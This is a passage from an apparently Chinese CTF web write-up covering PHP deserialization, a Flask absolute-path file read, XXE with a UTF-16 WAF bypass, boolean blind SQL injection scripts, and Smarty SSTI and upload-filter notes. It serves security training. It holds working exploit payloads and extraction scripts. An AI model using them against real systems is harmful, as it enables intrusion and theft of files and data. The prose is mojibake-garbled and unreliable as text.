class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">date</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;a)||<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;b))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;no array&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;a !== <span class="variable language_">$this</span>-&gt;b) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;a) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;b)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;a)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;b)) )&#123;</span><br><span class="line">            <span class="variable">$content</span>=<span class="title function_ invoke__">date</span>(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">            <span class="variable">$uuid</span>=<span class="title function_ invoke__">uniqid</span>().<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$uuid</span>,<span class="variable">$content</span>);</span><br><span class="line">            <span class="variable">$data</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/((\s)*(\n)+(\s)*)/i&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uuid</span>));</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$data</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])); </span><br></pre></td></tr></table></figure>

<p>phpååºåˆ—åŒ–</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">date</span>(<span class="string">&quot;/f\l\a\g&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#/flag</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$content=date($this-&gt;file);</span><br><span class="line"></span><br><span class="line">#  $contentæ¥å—ç»è¿‡è¢«dateå‡½æ•°æ ¼å¼åŒ–åçš„å˜é‡file</span><br><span class="line">#	date()çš„è¯´æ˜ï¼š</span><br><span class="line">#	è¯¥æ–¹æ³•ä¼šæ£€æµ‹ä¼ å…¥çš„å­—ç¬¦ä¸²ä¸­æ˜¯å¦æœ‰ç‰¹å®šçš„æ ¼å¼åŒ–å­—ç¬¦ï¼Œå¦‚Yï¼ˆå¹´ä»½ï¼‰ã€mï¼ˆæœˆä»½ï¼‰ã€dï¼ˆå¤©ï¼‰ã€Hï¼ˆæ—¶ï¼‰ã€iï¼ˆåˆ†é’Ÿï¼‰ã€sï¼ˆç§’ï¼‰ç­‰</span><br><span class="line">#    æ£€æµ‹å­˜åœ¨åˆ™ä¼šå°†æ ¼å¼åŒ–å­—ç¬¦æ›¿æ¢ä¸ºå½“å‰æ—¶é—´çš„å¯¹åº”éƒ¨åˆ†ï¼Œå¦åˆ™å°†å­—ç¬¦è¿›è¡ŒåŸæ ·è¾“å‡ºï¼ŒåŒæ—¶å¯ç”¨è½¬ä¹‰å­—ç¬¦å°†æ ¼å¼åŒ–å­—ç¬¦åŸæ ·è¾“å‡º</span><br></pre></td></tr></table></figure>

<p>payloadå¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">date</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>=<span class="string">&quot;/f\l\a\g&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">date</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>



<h2 id="NISACTF-2022-babyupload"><a href="#NISACTF-2022-babyupload" class="headerlink" title="[NISACTF 2022]babyupload"></a>[NISACTF 2022]babyupload</h2><p>æ‰“å¼€åå‡ºç°äº†ä¸€ä¸ªç®€å•çš„æ–‡ä»¶ä¸Šä¼ ç•Œé¢ï¼ŒæŸ¥çœ‹ä¸€ä¸‹æºç ï¼Œå‘ç°hintä¸º&#x2F;sourceï¼Œè®¿é—®ä¸€ä¸‹è·å¾—æºç </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, redirect, g, send_from_directory</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">SCHEMA = <span class="string">&quot;&quot;&quot;CREATE TABLE files (</span></span><br><span class="line"><span class="string">id text primary key,</span></span><br><span class="line"><span class="string">path text</span></span><br><span class="line"><span class="string">);</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db</span>():</span><br><span class="line">    g_db = <span class="built_in">getattr</span>(g, <span class="string">&#x27;_database&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> g_db <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        g_db = g._database = sqlite3.connect(<span class="string">&quot;database.db&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> g_db</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.before_first_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setup</span>():</span><br><span class="line">    os.remove(<span class="string">&quot;database.db&quot;</span>)</span><br><span class="line">    cur = db().cursor()</span><br><span class="line">    cur.executescript(SCHEMA)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;&quot;&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">&lt;form action=&quot;/upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span></span><br><span class="line"><span class="string">    Select image to upload:</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;submit&quot; value=&quot;Upload File&quot; name=&quot;submit&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;!-- /source --&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/source&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source</span>():</span><br><span class="line">    <span class="keyword">return</span> send_from_directory(directory=<span class="string">&quot;/var/www/html/&quot;</span>, path=<span class="string">&quot;www.zip&quot;</span>, as_attachment=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;.&quot;</span> <span class="keyword">in</span> file.filename:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Bad filename!&quot;</span>, <span class="number">403</span></span><br><span class="line">    conn = db()</span><br><span class="line">    cur = conn.cursor()</span><br><span class="line">    uid = uuid.uuid4().<span class="built_in">hex</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cur.execute(<span class="string">&quot;insert into files (id, path) values (?, ?)&quot;</span>, (uid, file.filename,))</span><br><span class="line">    <span class="keyword">except</span> sqlite3.IntegrityError:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Duplicate file&quot;</span></span><br><span class="line">    conn.commit()</span><br><span class="line"></span><br><span class="line">    file.save(<span class="string">&#x27;uploads/&#x27;</span> + file.filename)</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&#x27;/file/&#x27;</span> + uid)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/file/&lt;id&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">file</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    conn = db()</span><br><span class="line">    cur = conn.cursor()</span><br><span class="line">    cur.execute(<span class="string">&quot;select path from files where id=?&quot;</span>, (<span class="built_in">id</span>,))</span><br><span class="line">    res = cur.fetchone()</span><br><span class="line">    <span class="keyword">if</span> res <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;File not found&quot;</span>, <span class="number">404</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(res[0])</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(os.path.join(<span class="string">&quot;uploads/&quot;</span>, res[<span class="number">0</span>]), <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿›è¡Œå¸¸è§„çš„ä»£ç å®¡è®¡ï¼Œå‘ç°ä¸Šä¼ çš„æ–‡ä»¶åä¸èƒ½æœ‰ç‚¹ï¼Œé‚£ä¹ˆä¸Šä¼ æœ¨é©¬å•¥çš„å°±ä¸å­˜åœ¨äº†ï¼Œå› ä¸ºè§£æä¸äº†ï¼ŒæŒºå®‰å…¨çš„ï¼Œä½†æˆ‘ä»¬æ¥ç€å¾€ä¸‹çœ‹ï¼Œä¸Šä¼ æ–‡ä»¶åä¼šè·å¾—ä¸€ä¸ªuuidå¹¶å°†uuidå’Œfilenameä¸€èµ·å­˜å…¥æ•°æ®åº“ï¼Œåœ¨fileç›®å½•ä¸‹å¯ä»¥æŸ¥è¯¢ä¸Šä¼ çš„æ–‡ä»¶ï¼Œåœ¨fileå‡½æ•°ä¸­æœ‰ä¸€ä¸ªé‡è¦çš„åˆ©ç”¨ç‚¹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.path.join</span><br></pre></td></tr></table></figure>

<p>æ‰“å¼€uploadsç›®å½•ä¸‹çš„æ–‡ä»¶å¹¶è¯»å–å†…å®¹ï¼Œç„¶åreturnã€‚æ­¤å¤„å­˜åœ¨ç»å¯¹è·¯å¾„æ‹¼æ¥æ¼æ´ï¼ï¼ï¼</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ç»å¯¹è·¯å¾„æ‹¼æ¥æ¼æ´</span><br><span class="line"></span><br><span class="line">os.path.join(path,*paths)å‡½æ•°ç”¨äºå°†å¤šä¸ªæ–‡ä»¶è·¯å¾„è¿æ¥æˆä¸€ä¸ªç»„åˆçš„è·¯å¾„ã€‚ç¬¬ä¸€ä¸ªå‡½æ•°é€šå¸¸åŒ…å«äº†åŸºç¡€è·¯å¾„ï¼Œè€Œä¹‹åçš„æ¯ä¸ªå‚æ•°è¢«å½“ä½œç»„ä»¶æ‹¼æ¥åˆ°åŸºç¡€è·¯å¾„ä¹‹åã€‚</span><br><span class="line"></span><br><span class="line">ç„¶è€Œï¼Œè¿™ä¸ªå‡½æ•°æœ‰ä¸€ä¸ªå°‘æœ‰äººçŸ¥çš„ç‰¹æ€§ï¼Œå¦‚æœæ‹¼æ¥çš„æŸä¸ªè·¯å¾„ä»¥ / å¼€å¤´ï¼Œé‚£ä¹ˆåŒ…æ‹¬åŸºç¡€è·¯å¾„åœ¨å†…çš„æ‰€æœ‰å‰ç¼€è·¯å¾„éƒ½å°†è¢«åˆ é™¤ï¼Œè¯¥è·¯å¾„å°†è§†ä¸ºç»å¯¹è·¯å¾„</span><br></pre></td></tr></table></figure>

<p>å› æ­¤ï¼Œå¦‚æœæˆ‘ä»¬ä¸Šä¼ &#x2F;flagï¼Œé‚£ä¹ˆuploadså°†è¢«åˆ é™¤ï¼Œç›´æ¥è¯»å–&#x2F;flagä¸‹çš„å†…å®¹ï¼Œé‚£å°±æ‹¿æäº†ï¼</p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202091606567.png" alt="image-20241202091606567"></p>
<p>ç„¶åè®¿é—®fileä¸‹å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;0aff3bd4-26ba-4b76-bf5c-36bf2eb5e175&#125;</span><br></pre></td></tr></table></figure>



<h2 id="CSAWQual-2019-Unagi"><a href="#CSAWQual-2019-Unagi" class="headerlink" title="[CSAWQual 2019]Unagi"></a>[CSAWQual 2019]Unagi</h2><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202093801748.png" alt="image-20241202093801748" style="zoom: 80%;" />

<p>ç‚¹å‡»hereåæ˜¾ç¤ºå¦‚ä¸‹ï¼š</p>
<img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202093817078.png" alt="image-20241202093817078" style="zoom:67%;" />

<p>åŒæ—¶é¢˜ç›®å‘Šè¯‰æˆ‘ä»¬flagåœ¨&#x2F;flagï¼Œé‚£ä¹ˆxxeæ‹¿æäº†ã€‚</p>
<p>ä¸Šä¼ xmlå³å¯ï¼Œä½†æ˜¯ä¸Šä¼ åå‘ç°å­˜åœ¨waf</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE users [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;]&gt;</span><br><span class="line">&lt;users&gt; </span><br><span class="line">  &lt;user&gt;</span><br><span class="line">   &lt;username&gt;&amp;xxe;&lt;/username&gt;</span><br><span class="line">   &lt;password&gt;&amp;xxe;&lt;/password&gt;</span><br><span class="line">   &lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">   &lt;email&gt;&amp;xxe;&lt;/email&gt;</span><br><span class="line">   &lt;group&gt;&amp;xxe;&lt;/group&gt;</span><br><span class="line">   &lt;intro&gt;&amp;xxe;&lt;/intro&gt;</span><br><span class="line">  &lt;/user&gt;</span><br><span class="line">&lt;/users&gt; </span><br></pre></td></tr></table></figure>

<p>é‚£å°±ç¼–ç è½¬æ¢ä¸€ä¸‹ï¼Œç®€å•ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iconv -f UTF-8 -t UTF-16BE 1.xml &gt; 2.xml</span><br></pre></td></tr></table></figure>

<img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202093953244.png" alt="image-20241202093953244" style="zoom:80%;" />

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;b4784f04-d534-46f9-adee-431ea58cb80a&#125;</span><br></pre></td></tr></table></figure>



<h2 id="CISCN-2019ååŒ—Day2-Web1"><a href="#CISCN-2019ååŒ—Day2-Web1" class="headerlink" title="[CISCN 2019ååŒ—Day2]Web1"></a>[CISCN 2019ååŒ—Day2]Web1</h2><p>å¸ƒå°”ç›²æ³¨ï¼Œè¿™é‡Œå°±ç®€å•åœ°è´´ä¸¤ä¸ªè„šæœ¬å§</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://node4.anna.nssctf.cn:28299/index.php&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    <span class="built_in">max</span> = <span class="number">127</span></span><br><span class="line">    <span class="built_in">min</span> = <span class="number">32</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">min</span>&lt;<span class="built_in">max</span>:</span><br><span class="line">        mid = (<span class="built_in">max</span>+<span class="built_in">min</span>)//<span class="number">2</span></span><br><span class="line">        payload = <span class="string">&quot;if(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))&gt;&#123;&#125;,1,2)&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        <span class="comment">#ctfshow_web</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#ctfshow_fl0g</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#id,f1ag</span></span><br><span class="line">        <span class="comment"># payload = &quot;admin&#x27;and (ascii(substr((select f1ag from ctfshow_fl0g),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span></span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;id&quot;</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url= url,data=data)</span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Hello&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">min</span>=mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">max</span>=mid</span><br><span class="line">    flag+=<span class="built_in">chr</span>(<span class="built_in">min</span>)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># buuctf web Hack World</span></span><br><span class="line"><span class="keyword">from</span> turtle <span class="keyword">import</span> right</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://node4.anna.nssctf.cn:28299/index.php&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    letf = <span class="number">32</span></span><br><span class="line">    right = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> letf &lt; right:</span><br><span class="line">        mid = (letf + right) // <span class="number">2</span></span><br><span class="line">        payload = <span class="string">f&quot;0^(ascii(substr((select(flag)from(flag)),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>)&quot;</span></span><br><span class="line">        data = &#123;<span class="string">&quot;id&quot;</span>: payload&#125;</span><br><span class="line">        res = requests.post(url=url, data=data).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Hello&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">            letf = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right = mid</span><br><span class="line">    <span class="keyword">if</span> letf != <span class="number">32</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>(letf)</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>





<h2 id="CISCN-2019åä¸œå—-Web11"><a href="#CISCN-2019åä¸œå—-Web11" class="headerlink" title="[CISCN 2019åä¸œå—]Web11"></a>[CISCN 2019åä¸œå—]Web11</h2><p><strong>è€ƒç‚¹smarty ssti</strong></p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202113409968.png" alt="image-20241202113409968"></p>
<p>Smartyæ¨¡æ¿ï¼Œä¸å‡ºæ„å¤–åº”è¯¥å°±æ˜¯ssti</p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202113436817.png" alt="image-20241202113436817"></p>
<p>sstiç¡®å®šäº†</p>
<blockquote>
<p>åœ¨è¿™é‡Œæœ‰ä¸¤ä¸ªçŸ¥è¯†ç‚¹ï¼š</p>
<ol>
<li>Smartyæ”¯æŒä½¿ç”¨{php}{&#x2F;php}æ ‡ç­¾æ¥æ‰§è¡Œè¢«åŒ…è£¹å…¶ä¸­çš„phpæŒ‡ä»¤</li>
<li>XFFå¤´ä»£è¡¨äº†HTTPçš„è¯·æ±‚ç«¯çœŸå®çš„IPï¼Œé€šè¿‡ä¿®æ”¹XXFå¤´å¯ä»¥å®ç°ä¼ªé€ IP</li>
</ol>
</blockquote>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202113745659.png" alt="image-20241202113745659"></p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202113809806.png" alt="image-20241202113809806"></p>
<h2 id="FSCTF-2023-æ˜¯å…„å¼Ÿï¼Œå°±æ¥ä¼ ä½ ã®ğŸï¼"><a href="#FSCTF-2023-æ˜¯å…„å¼Ÿï¼Œå°±æ¥ä¼ ä½ ã®ğŸï¼" class="headerlink" title="[FSCTF 2023]æ˜¯å…„å¼Ÿï¼Œå°±æ¥ä¼ ä½ ã®ğŸï¼"></a>[FSCTF 2023]æ˜¯å…„å¼Ÿï¼Œå°±æ¥ä¼ ä½ ã®ğŸï¼</h2><p>è€ƒå¯Ÿæ–‡ä»¶ä¸Šä¼ ï¼Œå¯¹åç¼€ï¼Œå†…å®¹é•¿åº¦ï¼Œæ–‡ä»¶å¤´ï¼Œå†…å®¹è¿›è¡Œäº†è¿‡æ»¤ï¼Œæœ€ç»ˆpayloadå¦‚ä¸‹ï¼š</p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202120310235.png" alt="image-20241202120310235"></p>
<blockquote>
<p>BMä¸GIF89aä¸€æ ·å¯ä»¥ä½œä¸ºæ–‡ä»¶å¤´ï¼Œbmæ˜¯bmpçš„</p>
<p>çŸ­æ ‡ç­¾ä¸ç”¨é—­åˆï¼ï¼ï¼</p>
</blockquote>
<h2 id="NSSRound-13-Basic-flask-jwt"><a href="#NSSRound-13-Basic-flask-jwt" class="headerlink" title="[NSSRound#13 Basic]flask?jwt?"></a>[NSSRound#13 Basic]flask?jwt?</h2><p>æœ¬è´¨ä¸Šæ˜¯ä¸€é“éå¸¸ç®€å•çš„sessionä¼ªé€ é¢˜</p>
